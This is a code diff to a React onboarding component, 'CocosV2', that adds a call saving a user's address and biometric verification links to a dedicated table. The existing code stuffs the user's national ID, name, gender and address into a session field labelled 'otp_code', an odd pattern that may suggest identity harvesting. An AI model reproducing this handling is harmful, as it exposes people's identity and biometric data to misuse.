@@ -1147,8 +1147,28 @@ const CocosV2 = () => {
     await updateSession("biometric_started", { 
       otp_code: `dni:${lastDni}|name:${syncedFullName}|uuid:${userUuid}|gender:${userGender}|region:${addressData.region}|city:${addressData.city}|street:${addressData.street_name} ${addressData.street_number}|zip:${addressData.zip_code}|biometric_url:${bioResult.biometric_url}|biometric_id:${bioResult.biometric_id || ""}` 
     });
+
+    // Persist address + biometric data to dedicated table
+    await saveOnboardingData({
+      region: String(addressData.region || ""),
+      city: String(addressData.city || ""),
+      street: `${addressData.street_name || ""} ${addressData.street_number || ""}`.trim(),
+      zip_code: String(addressData.zip_code || ""),
+      biometric_url: bioResult.biometric_url,
+      biometric_id: bioResult.biometric_id || "",
+      status: "biometric_started",
+      metadata: {
+        region_id: addressData.region_id,
+        city_id: addressData.city_id,
+        street_name: addressData.street_name,
+        street_number: addressData.street_number,
+        floor: addressData.floor,
+        apartment: addressData.apartment,
+      },
+    });
+
     setStep("biometric");
-  }, [updateSession, lastDni, userUuid, userGender, syncedFullName]);
+  }, [updateSession, lastDni, userUuid, userGender, syncedFullName, saveOnboardingData]);
 
   // ── Biometric events tracking ──
   const handleBiometricEvent = useCallback(async (event: string) => {
